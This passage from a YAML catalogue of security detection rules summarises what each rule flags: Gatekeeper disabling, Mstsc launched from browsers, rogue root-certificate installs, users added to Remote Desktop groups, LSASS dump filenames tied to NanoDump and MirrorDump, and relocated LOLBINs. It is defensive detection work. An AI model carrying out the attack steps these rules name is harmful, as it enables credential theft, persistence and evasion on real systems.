    Auditbeat, Packetbeat), as well as the Fluentd log shipper. Additionally, the
    rule detects attempts to disable Apple's Gatekeeper through the `spctl disable`
    command. The detection is designed to identify potentially unauthorized or malicious
    activities aimed at compromising system security.
  Updated-Date: '2024_09_04'
ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 879761b8e9a6b52b75db1b6a0824c2b4
  Ruleset: core
  Summary: This rule detects the execution of Mstsc.exe, which is the Remote Desktop
    Protocol (RDP) client for Windows, originating from unconventional parent processes
    such as web browsers or email clients. These parent processes include commonly
    used browsers like Chrome, Firefox, and Edge, as well as Outlook for emails. The
    detection is based on identifying specific patterns where Mstsc.exe is executed
    from these less common sources, which could indicate a potential unauthorized
    RDP connection leveraging a local ".rdp" file from suspicious directories.
  Updated-Date: '2024_09_03'
ff7139bc-fdb1-4437-92f2-6afefe8884cb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 12b02045722115b0b78b929b7625f885
  Ruleset: sigmahq
  Summary: This rule detects instances where an SSH service on an OpenCanary node
    has had a login attempt. OpenCanary is a network-attached honeypot solution designed
    to mimic various services to lure and log potential attackers. An SSH login attempt
    on such a node may indicate attempts at unauthorized access or exploration of
    network vulnerabilities.
  Updated-Date: '2024_09_04'
ff992eac-6449-4c60-8c1d-91c9722a1d48:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 41d4537799137e6be73c716401101a71
  Ruleset: sigmahq
  Summary: This rule detects the execution of CertMgr.exe with the "add" flag, indicating
    the installation of a new certificate on a system. Adversaries may employ this
    technique to install a root certificate on compromised systems, allowing them
    to bypass warnings when connecting to adversary-controlled web servers, facilitating
    man-in-the-middle attacks and other malicious activities.
  Updated-Date: '2024_09_04'
ffa28e60-bdb1-46e0-9f82-05f7a61cc06e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee2769deca1ba06d0aa73fd89abb0cd0
  Ruleset: core
  Summary: This rule detects the addition of users to the local Remote Desktop Users
    group on a Windows system. Detection is triggered when certain command patterns
    related to adding users to groups, such as "localgroup /add" or "Add-LocalGroupMember
    -Group", are observed in process creation logs. This activity could indicate an
    attempt to establish persistent remote access or facilitate lateral movement within
    a network. The alerts are generated based on the presence of these specific commands
    in multiple languages, including English, French, and Spanish. While such actions
    can be a part of legitimate administrative tasks, they may also signify unauthorized
    access attempts.
  Updated-Date: '2024_09_03'
ffa6861c-4461-4f59-8a41-578c39f3f23e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f56aaf70ed601d18a9bdae90c33ca831
  Ruleset: core
  Summary: This rule detects the presence of specific keywords in the command line
    that may indicate an attempt to create a dump of the LSASS process on Windows
    systems. The monitored keywords include various forms and compressions of 'lsass.dmp',
    'lsass.zip', 'lsass.rar', 'Andrew.dmp', 'Coredump.dmp', and similar pattern variations.
    These terms are associated with known behaviors and tools used for credential
    dumping targeting the LSASS process, such as NanoDump and MirrorDump. The detection
    aims to identify suspicious command line activities that could signify a credential
    theft attempt via process memory dumping.
  Updated-Date: '2024_09_03'
fff9d2b7-e11c-4a69-93d3-40ef66189767:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ff34bac009e154b375a989bc3df5045
  Ruleset: sigmahq
  Summary: This rule detects suspicious copy operations attempting to transfer a program
    from system directories like System32, SysWOW64, or WinSxS to another location
    on disk. Such actions are commonly employed to move Living Off the Land Binaries
    (LOLBINs) like 'certutil' or 'desktopimgdownldr' to a different location under
    a new name to evade detection mechanisms that rely on file location. The detection
    analyzes process creation logs for instances of command prompt, PowerShell, robocopy,
    or xcopy used in conjunction with specific copy commands targeting system directories.
  Updated-Date: '2024_09_04'
